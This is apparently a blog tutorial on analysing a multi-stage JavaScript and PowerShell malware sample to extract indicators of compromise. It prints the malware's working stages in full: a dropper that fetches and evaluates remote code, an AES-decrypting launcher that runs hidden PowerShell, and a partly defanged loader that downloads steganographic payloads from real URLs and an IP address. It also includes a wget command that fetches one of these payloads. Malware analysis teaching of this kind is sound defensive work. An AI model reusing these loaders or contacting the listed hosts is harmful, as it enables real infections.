---
title: "Malware Analysis I - Detecting Indicators of Compromise and malicious Infrastructure"
datePublished: Mon Mar 04 2024 20:28:33 GMT+0000 (Coordinated Universal Time)
cuid: cltde8o7w000209js0xrycgk9
slug: malware-analysis-i-detecting-indicators-of-compromise-and-malicious-infrastructure
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1709584018492/6855758a-dee5-4fab-9cd1-6a2096c99f4b.png
tags: hacking, cybersecurity-1, threat-intelligence, malware-analysis

---

Today we will see how we can identify malware urls / indicators of compromise from malware and the malware sample we will use is:

[https://bazaar.abuse.ch/sample/41f76926477c7f8759900567ced4e5e1f9057e40d2a151badc873d23f372997e/](https://bazaar.abuse.ch/sample/41f76926477c7f8759900567ced4e5e1f9057e40d2a151badc873d23f372997e/)

## Stage 1 - `comprobante_swift89534657687.js`

Directly after downloading the stage 1 payload from malware bazaar you can open it inside your malware analysis VM (flareVM), if you have not prepared one yet, have a look at this video:

%[https://www.youtube.com/watch?v=VqJM3eo2lPg] 

You can open the malware archive (.zip) with 7zip and use the password `infected` to extract the stage1 malware.

When you open the .js file with a text editor or vscode (make sure to set the restrictions to “I dont trust the authors of this folder/file” when it asks you) you will see this:

```powershell
function preexistente(eudiometria) {
  return String.fromCharCode(eudiometria);
}

var pesadume = "<https://past>" + preexistente(101) + "." + preexistente(101) + "" + preexistente(101) + "/d/ARhCV";

var guabirabeira = tripes(pesadume);
horographia(guabirabeira);

function esfolhar(celadolo) {
  var esfuziada = new ActiveXObject("WScript.Shell");
  esfuziada.Run("perispiritual", celadolo);
  var usufruto = esfuziada.Popup("araribina:", 0, "Prompt", 0);
  return usufruto;
}

function horographia(praina) {
  eval(praina);
}

function tripes(pesadume) {
  var cantata = new ActiveXObject("MSXML2.XMLHTTP");
  cantata.open("GET", pesadume, false);
  cantata.send();
  return cantata.responseText;
}
```

Short and sweet but dangerous nonetheless. At the top you can see a function definition (preexistente) that takes one parameter called `eudiometria` which then is translated into a string from a `CharCode` → that is a numerical representation of letters/numbers etc. typically used in javascript / your browser

AHA!

Ok and next what looks like a url is combined from `https://past` + three function calls with the number 101 + `/d/ARhCV`

Great but what is `String.fromCharCode(101)` ?

Open your browser and find out → go to any page and either right click on the page and use `inspect` and then on `console` at the bottom

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581799797/b21fb5e0-3896-4524-9b5f-fafcb8f7eb8d.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581829340/cc7f2173-c3cc-4a91-a5b7-fff356be0ab5.png align="center")

or directly click on the `developer → javascript console` option

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581845940/01cdf521-30b8-419a-8d6a-77e992985bcf.png align="center")

This will open the javascript developer console and if you paste/type `String.fromCharCode(101)` into it

→ watch magic 🪄 happen (if your browser tells you that you cannot paste code immediately, just follow the guide and type `allow pasting` first then press enter and continue to paste the snippet

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581903923/256ad88d-11ed-4f78-99bd-f2f575d16cc1.png align="center")

`101` apparently is the letter `e` so when we combine all those elements together we have a new url to download our 2nd stage payload from:

2nd stage from `https[:]//paste.ee/d/ARhCV`

## Stage 2 - `https[:]//paste.ee/d/ARhCV`

When you have possibly malicious urls the last thing you want to do is to open those on your normal computer - instead you can use someone else’s computer to do that for you 😇

my favorite is [https://browserling.com](https://browserling.com) which lets you copy and paste and open urls that you are not sure of → plug the url into the form and click `Test now!`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581938321/4c2c227b-e135-4397-805a-fb576b1f312e.png align="center")

You should be greeted with the following beautiful screen:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581953846/f807aa88-90b0-4ae3-b0ba-b1c378791f0e.png align="center")

if not → this is the script that was available there:

```jsx
function omphalorrhagia(melam) {
    var sephelo = new ActiveXObject("MSXML2.DOMDocument");
    var magnificar = sephelo.createElement("b64");
    magnificar.dataType = "bin.base64";
    magnificar.text = melam;
    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(magnificar.nodeTypedValue);
    anete.Position = 0;
    var forrageal = anete.Read();
    anete.Close();
    return forrageal;
}

function patornear(perculso, key) {
    var pacientemente = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
    pacientemente.Mode = 1; // CipherMode.CBC
    pacientemente.Padding = 3; // PaddingMode.Zeros
    pacientemente.BlockSize = 128;
    pacientemente.KeySize = 256;

    var metrofotografia = new ActiveXObject("System.Text.UTF8Encoding");
    var zunga = new ActiveXObject("System.Security.Cryptography.SHA256Managed");
    var desenfrechar = zunga.ComputeHash_2(metrofotografia.GetBytes_4(key));
    pacientemente.Key = desenfrechar;

    var bracaraugustano = omphalorrhagia(perculso);

    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(bracaraugustano);
    anete.Position = 0;

    var saltadouro = new ActiveXObject("ADODB.Stream");
    saltadouro.Type = 1; // adTypeBinary
    saltadouro.Open();
    // read first 16 bytes and make that the initialization vector (IV) for the decryption
    saltadouro.Write(anete.Read(16));
    saltadouro.Position = 0;
    pacientemente.IV = saltadouro.Read();

    anete.Position = 16; // Move to after the IV -> skip the IV and only decrypt the data after !
    var encordoadura = anete.Read();
    var trautar = pacientemente.CreateDecryptor();

    var viga = new ActiveXObject("ADODB.Stream");
    viga.Type = 1; // adTypeBinary
    viga.Open();
    viga.Write(encordoadura);
    viga.Position = 0;
    
    // decrypt
    var roleiro = trautar.TransformFinalBlock((viga.Read()), 0, viga.Size);
    var forrageal = metrofotografia.GetString((roleiro));

    anete.Close();
    saltadouro.Close();
    viga.Close();

    // return decrypted powershell script
    return forrageal;
}

var perculso = "U6QYC302+gYnmiIMvSYl13luCzfghsk1EkWwMHcen71WAx/vxj2b4kzthulb/qIZXPyDDrOxbK47oModVkUVOH21YwWC+x8RiXfTfQ2bE7IhkHyxCre0Q6MZ3FzjjbECenlR1SjzO6ly81brt+kwPIung8Tbtxkrz9OYBRofhtsfRxZKticveCKUAbys+okxzO4eNBEOQkmi6Kj/cr9aLGxbMUaCuPN2VQqUDps3xie2fPGMqz9lkqupoLsym58il3tKxJe/EZqnoMzLUeeEp8n+MTjmHa1Hwtrau91+s1XLZiDXKstLwccfr6nvKuo50f6FXQqgpJTOHwbEsklnfzmqAVYK+GqAQxtvDfK9LceiFVGMKZYzL84LWy02htydZNMSWZkdjETKc5EXg/KdPsDN0yT+vWdzp3Hiz4UtGzopY3G8G2iXjVazuZArPBwXEius9bG1xVkmJbCPHmcIa/KI1+Une/F+yXvWwoheJBDiGMxnvFQ4CYpBs0qpOSB+95s57xb0xFkuEGMcYPytyyyJsDZ5adf1d7sTvn0+ZjpGxMz5VAG54502ORVT+NprlvaXQXyl2rSAa9aoe8o9L+rBf/1KZeFEn854uNZxdguBYzLBG+4dA9/zsYH/3c9wyY88rXkSgMy8HdyobbFN6K6n2ZQaT7BTUVx2cEMrYhEzeHVwudcIKzj3U/V1CcBz66WiYkuuSBnjje8a+XxGhrjnuIm08CtHTDAumP8XT+VRUlqVSlMUuyGbPILcxwt2mj4zKLlPX5ciL4ebA/poNwNYN2webG/ctHxkGGzm+JJByu/Na23dzI8ZlxaomV+s4lzrOuEeBENyiT6tZkEr0nfNS2sXx5spPEqC3hVVkKASkSE0jeWNLms0wWvoMGxBPJUhPLwcgZPROgbQv6kgE20+Pdgt7ezY3pgadfRV/jg4JtTeezA1w2WCvU0cL2RDyTYDhmiIU7sDNEFapSEU16NBDe4zi7+3Ypz6y8Nzzo2sI2l5uhrVdT2g2UzYoDM8c30/dgwZqLJzWHZXax/uDnlmvcBbxvZ1YFSg4m6/I+RUzF46L0EQs+bkVQJmcolKX8tH5AP+jFzarKgA8OhPZexsdnXe0xSBRyuIJwrtNzIBRYzgSF1MqRU7i+IMD2GYc5JvWDNLJ3H/tEpknDIV9XLhq5bKQm35eOHTnFcrAceZWoTFrpToUxiQa94/cOIgb8Yialab0HyoQ6S9wPTVbo42hLnfutxrajHsAIiciipEbDAsGgDwzHv/48pFjv8G1dqrlO0Adp90KtLuN3W44neUZur8pmAmJWsPEogHgu8b1ulKQqEoWMZxkIcwsIFQa+T5+MabIocphFn5rExhwjQm9kTDvPK1xMzubNPijXdVWYBp+Hkf+ViLP8XO3+3DTFwK4o9AvkyFQz6haiR/jRgqDTaBNc+6ny8nrhJhK6RG7UvUn6MCSQy/2mMtR4CVuFg+i7sJbVnokoWpeDhijEOQREVC4FfRmJ/BlKe1FO0xJBAYaVSKc1kASDRfd4EwZx4ld4Z4/7oFsAdeozcFrP1o+FlpUwOx9jNqxdFLk+wc+mELjwO84JbTeNQ/tAnxpBZnepD0irx/ZZLK7EirERyZb7w2N2AONiKvemcUaews9Yi35xSeGdR7458ZgrQ27RxKBJt8dE9bliGsAswEZpPhBsToyC+DTTemG2KgHfC4663PpKwZ5L79Dw2NIGf4";
var lacertinos = "12345678901234567890123456789012";
var durguete = patornear(perculso, lacertinos);

var sorte = new ActiveXObject("WScript.Shell");
sorte.Run("powershell -Command \\"" + durguete + "\\"", 0, false);
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581978630/79a2ba63-06c1-4693-bc63-17ac685a620b.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709581987340/8b85629a-8d7d-456e-9b87-b07dec35335e.png align="center")

This script does a lot of things but we can walk through it from top to bottom and use my MAGIC MALWARE ANALYSIS EXPLAINER FRIEND - ChatGPT to help us.

We start with the first function

```powershell
function omphalorrhagia(melam) {
    var sephelo = new ActiveXObject("MSXML2.DOMDocument");
    var magnificar = sephelo.createElement("b64");
    magnificar.dataType = "bin.base64";
    magnificar.text = melam;
    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(magnificar.nodeTypedValue);
    anete.Position = 0;
    var forrageal = anete.Read();
    anete.Close();
    return forrageal;
}
```

This takes a single input and returns a single output → in between it tries to open a browser / DOMDocument and loads some base64 encoded string into an object and returns that object/binary data 😅✅

How would you find this out if you cannot read the code? EASY - just ask ChatGPT:

```powershell
what does this function do ```function omphalorrhagia(melam) {
    var sephelo = new ActiveXObject("MSXML2.DOMDocument");
    var magnificar = sephelo.createElement("b64");
    magnificar.dataType = "bin.base64";
    magnificar.text = melam;
    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(magnificar.nodeTypedValue);
    anete.Position = 0;
    var forrageal = anete.Read();
    anete.Close();
    return forrageal;
}```
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582176287/9e9548a1-e9e2-4944-b345-60d2746b462a.png align="center")

and our best friend tells us:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582193026/09b3210c-63bd-4bb3-82ab-c3a50e312189.png align="center")

AHA! great, that helps → but what happens next?

The 2nd function `patornear` takes two arguments, `perculso` and `key` and does some cryptography in the beginning (`RijndaelManaged`, often called AES), then sets some values and uses the previous function `var bracaraugustano = omphalorrhagia(perculso);` with the first input

AHA! so perculso is base64 encoded code, and we use it in this 2nd function for something!

What we do next is to open the file and read the `first 16 bytes` into a variable called `pacientemente.IV` - for those of you who don’t know, IV is the initialization vector often used in decryption operations together with a key.

key? EN CE MOMENT! I remember that there was a key in this function as well, so we have the IV and the Key now?

...but where is the text to be decoded?!

We also take that from the base64 encoded string → the first 16 bytes (the IV) are skipped and we read the rest into a variable and then decrypt it with the key and the IV. 🤯

The last step is to return the decrypted code in plain-text.

```javascript

function patornear(perculso, key) {
    var pacientemente = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
    pacientemente.Mode = 1; // CipherMode.CBC
    pacientemente.Padding = 3; // PaddingMode.Zeros
    pacientemente.BlockSize = 128;
    pacientemente.KeySize = 256;

    var metrofotografia = new ActiveXObject("System.Text.UTF8Encoding");
    var zunga = new ActiveXObject("System.Security.Cryptography.SHA256Managed");
    var desenfrechar = zunga.ComputeHash_2(metrofotografia.GetBytes_4(key));
    pacientemente.Key = desenfrechar;

    var bracaraugustano = omphalorrhagia(perculso);

    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(bracaraugustano);
    anete.Position = 0;

    var saltadouro = new ActiveXObject("ADODB.Stream");
    saltadouro.Type = 1; // adTypeBinary
    saltadouro.Open();
    // read first 16 bytes and make that the initialization vector (IV) for the decryption
    saltadouro.Write(anete.Read(16));
    saltadouro.Position = 0;
    pacientemente.IV = saltadouro.Read();

    anete.Position = 16; // Move to after the IV -> skip the IV and only decrypt the data after !
    var encordoadura = anete.Read();
    var trautar = pacientemente.CreateDecryptor();

    var viga = new ActiveXObject("ADODB.Stream");
    viga.Type = 1; // adTypeBinary
    viga.Open();
    viga.Write(encordoadura);
    viga.Position = 0;
    
    // decrypt the "base64 string" using the key and the IV
    var roleiro = trautar.TransformFinalBlock((viga.Read()), 0, viga.Size);
    var forrageal = metrofotografia.GetString((roleiro));

    anete.Close();
    saltadouro.Close();
    viga.Close();

    // return decrypted powershell script
    return forrageal;
}
```

WAOOOOWWW MAGIC ! 🦄

Again if you don’t understand this part, ask your friend ChatGPT for an explanation

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582233878/7326e6a5-8f70-4d9f-b4b0-f32d7a4f2cb9.png align="center")

On to the last steps - this is the base64 encoded something (`perculso`) and the key (`lacertinos`) which are then fed into the 2nd function and the result from that function call (plaintext) is used to run a powershell command that the plaintext holds ✨🦹

```jsx
var perculso = "U6QYC302+gYnmiIMvSYl13luCzfghsk1EkWwMHcen71WAx/vxj2b4kzthulb/qIZXPyDDrOxbK47oModVkUVOH21YwWC+x8RiXfTfQ2bE7IhkHyxCre0Q6MZ3FzjjbECenlR1SjzO6ly81brt+kwPIung8Tbtxkrz9OYBRofhtsfRxZKticveCKUAbys+okxzO4eNBEOQkmi6Kj/cr9aLGxbMUaCuPN2VQqUDps3xie2fPGMqz9lkqupoLsym58il3tKxJe/EZqnoMzLUeeEp8n+MTjmHa1Hwtrau91+s1XLZiDXKstLwccfr6nvKuo50f6FXQqgpJTOHwbEsklnfzmqAVYK+GqAQxtvDfK9LceiFVGMKZYzL84LWy02htydZNMSWZkdjETKc5EXg/KdPsDN0yT+vWdzp3Hiz4UtGzopY3G8G2iXjVazuZArPBwXEius9bG1xVkmJbCPHmcIa/KI1+Une/F+yXvWwoheJBDiGMxnvFQ4CYpBs0qpOSB+95s57xb0xFkuEGMcYPytyyyJsDZ5adf1d7sTvn0+ZjpGxMz5VAG54502ORVT+NprlvaXQXyl2rSAa9aoe8o9L+rBf/1KZeFEn854uNZxdguBYzLBG+4dA9/zsYH/3c9wyY88rXkSgMy8HdyobbFN6K6n2ZQaT7BTUVx2cEMrYhEzeHVwudcIKzj3U/V1CcBz66WiYkuuSBnjje8a+XxGhrjnuIm08CtHTDAumP8XT+VRUlqVSlMUuyGbPILcxwt2mj4zKLlPX5ciL4ebA/poNwNYN2webG/ctHxkGGzm+JJByu/Na23dzI8ZlxaomV+s4lzrOuEeBENyiT6tZkEr0nfNS2sXx5spPEqC3hVVkKASkSE0jeWNLms0wWvoMGxBPJUhPLwcgZPROgbQv6kgE20+Pdgt7ezY3pgadfRV/jg4JtTeezA1w2WCvU0cL2RDyTYDhmiIU7sDNEFapSEU16NBDe4zi7+3Ypz6y8Nzzo2sI2l5uhrVdT2g2UzYoDM8c30/dgwZqLJzWHZXax/uDnlmvcBbxvZ1YFSg4m6/I+RUzF46L0EQs+bkVQJmcolKX8tH5AP+jFzarKgA8OhPZexsdnXe0xSBRyuIJwrtNzIBRYzgSF1MqRU7i+IMD2GYc5JvWDNLJ3H/tEpknDIV9XLhq5bKQm35eOHTnFcrAceZWoTFrpToUxiQa94/cOIgb8Yialab0HyoQ6S9wPTVbo42hLnfutxrajHsAIiciipEbDAsGgDwzHv/48pFjv8G1dqrlO0Adp90KtLuN3W44neUZur8pmAmJWsPEogHgu8b1ulKQqEoWMZxkIcwsIFQa+T5+MabIocphFn5rExhwjQm9kTDvPK1xMzubNPijXdVWYBp+Hkf+ViLP8XO3+3DTFwK4o9AvkyFQz6haiR/jRgqDTaBNc+6ny8nrhJhK6RG7UvUn6MCSQy/2mMtR4CVuFg+i7sJbVnokoWpeDhijEOQREVC4FfRmJ/BlKe1FO0xJBAYaVSKc1kASDRfd4EwZx4ld4Z4/7oFsAdeozcFrP1o+FlpUwOx9jNqxdFLk+wc+mELjwO84JbTeNQ/tAnxpBZnepD0irx/ZZLK7EirERyZb7w2N2AONiKvemcUaews9Yi35xSeGdR7458ZgrQ27RxKBJt8dE9bliGsAswEZpPhBsToyC+DTTemG2KgHfC4663PpKwZ5L79Dw2NIGf4";
var lacertinos = "12345678901234567890123456789012";
var durguete = patornear(perculso, lacertinos);

var sorte = new ActiveXObject("WScript.Shell");
sorte.Run("powershell -Command \\"" + durguete + "\\"", 0, false);
```

Wonderful, now there is only a slight issue… this script needs internet explorer APIs to work and well… that is not something we have or want 😀

How can we now isolate the command in plaintext?!

Two options -

1. use cyberchef and fiddle with the parameters until you find the correct decryption setup
    
2. use ChatGPT to change this beautiful mess into PowerShell and copy paste to victory ✌️🥇
    

Why powershell you ask?! because we use part of the .net API and that is easiest to use in combination with powershell / C# (and I hate C#…) 😅

So you go and isolate the important function and make it easier for chatgpt to understand by removing the parameters and plugging them directly into the function and asking it to make this beautiful powershell PLEASE

intput:

```jsx
function decrypt_base64_enc_blob() {
    var key = "12345678901234567890123456789012";
    var base64_string = "U6QYC302+gYnmiIMvSYl13luCzfghsk1EkWwMHcen71WAx/vxj2b4kzthulb/qIZXPyDDrOxbK47oModVkUVOH21YwWC+x8RiXfTfQ2bE7IhkHyxCre0Q6MZ3FzjjbECenlR1SjzO6ly81brt+kwPIung8Tbtxkrz9OYBRofhtsfRxZKticveCKUAbys+okxzO4eNBEOQkmi6Kj/cr9aLGxbMUaCuPN2VQqUDps3xie2fPGMqz9lkqupoLsym58il3tKxJe/EZqnoMzLUeeEp8n+MTjmHa1Hwtrau91+s1XLZiDXKstLwccfr6nvKuo50f6FXQqgpJTOHwbEsklnfzmqAVYK+GqAQxtvDfK9LceiFVGMKZYzL84LWy02htydZNMSWZkdjETKc5EXg/KdPsDN0yT+vWdzp3Hiz4UtGzopY3G8G2iXjVazuZArPBwXEius9bG1xVkmJbCPHmcIa/KI1+Une/F+yXvWwoheJBDiGMxnvFQ4CYpBs0qpOSB+95s57xb0xFkuEGMcYPytyyyJsDZ5adf1d7sTvn0+ZjpGxMz5VAG54502ORVT+NprlvaXQXyl2rSAa9aoe8o9L+rBf/1KZeFEn854uNZxdguBYzLBG+4dA9/zsYH/3c9wyY88rXkSgMy8HdyobbFN6K6n2ZQaT7BTUVx2cEMrYhEzeHVwudcIKzj3U/V1CcBz66WiYkuuSBnjje8a+XxGhrjnuIm08CtHTDAumP8XT+VRUlqVSlMUuyGbPILcxwt2mj4zKLlPX5ciL4ebA/poNwNYN2webG/ctHxkGGzm+JJByu/Na23dzI8ZlxaomV+s4lzrOuEeBENyiT6tZkEr0nfNS2sXx5spPEqC3hVVkKASkSE0jeWNLms0wWvoMGxBPJUhPLwcgZPROgbQv6kgE20+Pdgt7ezY3pgadfRV/jg4JtTeezA1w2WCvU0cL2RDyTYDhmiIU7sDNEFapSEU16NBDe4zi7+3Ypz6y8Nzzo2sI2l5uhrVdT2g2UzYoDM8c30/dgwZqLJzWHZXax/uDnlmvcBbxvZ1YFSg4m6/I+RUzF46L0EQs+bkVQJmcolKX8tH5AP+jFzarKgA8OhPZexsdnXe0xSBRyuIJwrtNzIBRYzgSF1MqRU7i+IMD2GYc5JvWDNLJ3H/tEpknDIV9XLhq5bKQm35eOHTnFcrAceZWoTFrpToUxiQa94/cOIgb8Yialab0HyoQ6S9wPTVbo42hLnfutxrajHsAIiciipEbDAsGgDwzHv/48pFjv8G1dqrlO0Adp90KtLuN3W44neUZur8pmAmJWsPEogHgu8b1ulKQqEoWMZxkIcwsIFQa+T5+MabIocphFn5rExhwjQm9kTDvPK1xMzubNPijXdVWYBp+Hkf+ViLP8XO3+3DTFwK4o9AvkyFQz6haiR/jRgqDTaBNc+6ny8nrhJhK6RG7UvUn6MCSQy/2mMtR4CVuFg+i7sJbVnokoWpeDhijEOQREVC4FfRmJ/BlKe1FO0xJBAYaVSKc1kASDRfd4EwZx4ld4Z4/7oFsAdeozcFrP1o+FlpUwOx9jNqxdFLk+wc+mELjwO84JbTeNQ/tAnxpBZnepD0irx/ZZLK7EirERyZb7w2N2AONiKvemcUaews9Yi35xSeGdR7458ZgrQ27RxKBJt8dE9bliGsAswEZpPhBsToyC+DTTemG2KgHfC4663PpKwZ5L79Dw2NIGf4";
    var pacientemente = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
    pacientemente.Mode = 1; // CipherMode.CBC
    pacientemente.Padding = 3; // PaddingMode.Zeros
    pacientemente.BlockSize = 128;
    pacientemente.KeySize = 256;

    var metrofotografia = new ActiveXObject("System.Text.UTF8Encoding");
    var zunga = new ActiveXObject("System.Security.Cryptography.SHA256Managed");
    var desenfrechar = zunga.ComputeHash_2(metrofotografia.GetBytes_4(key));
    pacientemente.Key = desenfrechar;

    var bracaraugustano = omphalorrhagia(base64_string);

    var anete = new ActiveXObject("ADODB.Stream");
    anete.Type = 1; // adTypeBinary
    anete.Open();
    anete.Write(bracaraugustano);
    anete.Position = 0;

    var saltadouro = new ActiveXObject("ADODB.Stream");
    saltadouro.Type = 1; // adTypeBinary
    saltadouro.Open();
    saltadouro.Write(anete.Read(16));
    saltadouro.Position = 0;
    pacientemente.IV = saltadouro.Read();

    anete.Position = 16; // Move to after the IV
    var encordoadura = anete.Read();
    var trautar = pacientemente.CreateDecryptor();

    var viga = new ActiveXObject("ADODB.Stream");
    viga.Type = 1; // adTypeBinary
    viga.Open();
    viga.Write(encordoadura);
    viga.Position = 0;
    
    var roleiro = trautar.TransformFinalBlock((viga.Read()), 0, viga.Size);
    var powershell_command = metrofotografia.GetString((roleiro));

    anete.Close();
    saltadouro.Close();
    viga.Close();

    return powershell_command;
}
```

because the script requires activex and dotnet api’s to be available we try to convert it to powershell so that we can easily execute it (make sure to copy and paste the key + base64\_string from the original script afterwards, because chatgpt likes to hallucinate long strings and not take the original one’s - dont ask me how I found out 😅)

You can use the following prompt:

```jsx
what would this function look like in powershell ``` <PASTE_FUNCTION_HERE> ```
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582269909/60cad2f6-1439-4931-ad9c-8546380e2781.png align="center")

You should get back something like the following script:

```powershell
function Decrypt-Base64EncryptedBlob {
    param (
        [string]$base64String
    )

    # Define the key
    $key = "12345678901234567890123456789012"

    # Create RijndaelManaged object
    $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
    $rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $rijndael.BlockSize = 128
    $rijndael.KeySize = 256

    # Create SHA256Managed object and compute hash
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
    $keyBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($key))
    $rijndael.Key = $keyBytes

    # Decode the base64 string
    $decodedBytes = [System.Convert]::FromBase64String($base64String)

    # Extract IV from the beginning of the decoded bytes
    $iv = $decodedBytes[0..15]
    $rijndael.IV = $iv

    # Decrypt the data
    $decryptor = $rijndael.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($decodedBytes, 16, $decodedBytes.Length - 16)

    # Convert decrypted bytes to string
    $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

    return $decryptedString
}
$encryptedBase64String = "U6QYC302+gYnmiIMvSYl13luCzfghsk1EkWwMHcen71WAx/vxj2b4kzthulb/qIZXPyDDrOxbK47oModVkUVOH21YwWC+x8RiXfTfQ2bE7IhkHyxCre0Q6MZ3FzjjbECenlR1SjzO6ly81brt+kwPIung8Tbtxkrz9OYBRofhtsfRxZKticveCKUAbys+okxzO4eNBEOQkmi6Kj/cr9aLGxbMUaCuPN2VQqUDps3xie2fPGMqz9lkqupoLsym58il3tKxJe/EZqnoMzLUeeEp8n+MTjmHa1Hwtrau91+s1XLZiDXKstLwccfr6nvKuo50f6FXQqgpJTOHwbEsklnfzmqAVYK+GqAQxtvDfK9LceiFVGMKZYzL84LWy02htydZNMSWZkdjETKc5EXg/KdPsDN0yT+vWdzp3Hiz4UtGzopY3G8G2iXjVazuZArPBwXEius9bG1xVkmJbCPHmcIa/KI1+Une/F+yXvWwoheJBDiGMxnvFQ4CYpBs0qpOSB+95s57xb0xFkuEGMcYPytyyyJsDZ5adf1d7sTvn0+ZjpGxMz5VAG54502ORVT+NprlvaXQXyl2rSAa9aoe8o9L+rBf/1KZeFEn854uNZxdguBYzLBG+4dA9/zsYH/3c9wyY88rXkSgMy8HdyobbFN6K6n2ZQaT7BTUVx2cEMrYhEzeHVwudcIKzj3U/V1CcBz66WiYkuuSBnjje8a+XxGhrjnuIm08CtHTDAumP8XT+VRUlqVSlMUuyGbPILcxwt2mj4zKLlPX5ciL4ebA/poNwNYN2webG/ctHxkGGzm+JJByu/Na23dzI8ZlxaomV+s4lzrOuEeBENyiT6tZkEr0nfNS2sXx5spPEqC3hVVkKASkSE0jeWNLms0wWvoMGxBPJUhPLwcgZPROgbQv6kgE20+Pdgt7ezY3pgadfRV/jg4JtTeezA1w2WCvU0cL2RDyTYDhmiIU7sDNEFapSEU16NBDe4zi7+3Ypz6y8Nzzo2sI2l5uhrVdT2g2UzYoDM8c30/dgwZqLJzWHZXax/uDnlmvcBbxvZ1YFSg4m6/I+RUzF46L0EQs+bkVQJmcolKX8tH5AP+jFzarKgA8OhPZexsdnXe0xSBRyuIJwrtNzIBRYzgSF1MqRU7i+IMD2GYc5JvWDNLJ3H/tEpknDIV9XLhq5bKQm35eOHTnFcrAceZWoTFrpToUxiQa94/cOIgb8Yialab0HyoQ6S9wPTVbo42hLnfutxrajHsAIiciipEbDAsGgDwzHv/48pFjv8G1dqrlO0Adp90KtLuN3W44neUZur8pmAmJWsPEogHgu8b1ulKQqEoWMZxkIcwsIFQa+T5+MabIocphFn5rExhwjQm9kTDvPK1xMzubNPijXdVWYBp+Hkf+ViLP8XO3+3DTFwK4o9AvkyFQz6haiR/jRgqDTaBNc+6ny8nrhJhK6RG7UvUn6MCSQy/2mMtR4CVuFg+i7sJbVnokoWpeDhijEOQREVC4FfRmJ/BlKe1FO0xJBAYaVSKc1kASDRfd4EwZx4ld4Z4/7oFsAdeozcFrP1o+FlpUwOx9jNqxdFLk+wc+mELjwO84JbTeNQ/tAnxpBZnepD0irx/ZZLK7EirERyZb7w2N2AONiKvemcUaews9Yi35xSeGdR7458ZgrQ27RxKBJt8dE9bliGsAswEZpPhBsToyC+DTTemG2KgHfC4663PpKwZ5L79Dw2NIGf4";
Decrypt-Base64EncryptedBlob -base64String $encryptedBase64String
```

paste that into a new Powershell script (it’s convenient to use powershell ISE) and press the green play button in the navigation bar ⬇️

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582317709/53ad825d-a9e8-4dc3-9306-97aeb3e7ec66.png align="center")

The output will be shown in the blue window below ⬆️

If you prettify this script into a more human readable format you will get this 3rd stage payload (I took the liberty to defang it by commenting the last three lines):

```powershell
function DownloadDataFromLinks { param ([string[]]$links) 
    $webClient = New-Object System.Net.WebClient; 
    $shuffledLinks = Get-Random -InputObject $links -Count $links.Length; 
    foreach ($link in $shuffledLinks) { 
        try { 
            return $webClient.DownloadData($link) 
            } catch { continue } 
        }; 
   
        return $null 
    }; 
    $links = @('<https://uploaddeimagens.com.br/images/004/731/991/original/new_image.jpg?1707144482>', '<http://45.74.19.84/xampp/bkp/js_bkp.jpg>');
    $imageBytes = DownloadDataFromLinks $links; 
    if ($imageBytes -ne $null) { 
    $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes); 
    $startFlag = '<<BASE64_START>>';
    $endFlag = '<<BASE64_END>>'; 
    $startIndex = $imageText.IndexOf($startFlag); 
    $endIndex = $imageText.IndexOf($endFlag); 

    if ($startIndex -ge 0 -and $endIndex -gt $startIndex) {
 
       $startIndex += $startFlag.Length; 
       $base64Length = $endIndex - $startIndex; 
       $base64Command = $imageText.Substring($startIndex, $base64Length); 
       $commandBytes = [System.Convert]::FromBase64String($base64Command); 
       $commandBytes;

       # defang the script by commenting the dangerous lines
       #$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes); 
       #$type = $loadedAssembly.GetType('PROJETOAUTOMACAO.VB.Home'); 
       #$method = $type.GetMethod('VAI').Invoke($null, [object[]] ('txt.diord46esab/19.412.542.271//:ptth' , 'desativado' , 'C:\\ProgramData\\' , 'Name'))
       }
}
```

What does that do though?! 🤔💭

from top to bottom

→ it defines a function that download an image from one random url out of all the urls that have been provided (sometimes called loader)

→ it then defines 2 download links `https[:]//uploaddeimagens.com.br/images/004/731/991/original/new_image.jpg?1707144482`

`http[:]//45.74.19.84/xampp/bkp/js_bkp.jpg`

→ the script only continues if the download was successful and then looks for `<<BASE64_START>>` and `<<BASE64_END>>` in the source code of the downloaded images → STEGO or `Steganography` , that means hiding malware / code in images

Ok so we need internet access to check the images → go to browserling and see if one of the urls is still up → we get lucky, the first one works 🎉

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582586189/2f72a24a-d0e6-4ea8-938a-3331a09188dc.png align="center")

Ok now swap into a linux throw-away VM and use `wget` to download the image from the server

```jsx
wget https://uploaddeimagens.com.br/images/004/731/991/original/new_image.jpg?1707144482 -O image.jpg
```

and then we check if we can see `BASE64_START` in the image source with grep

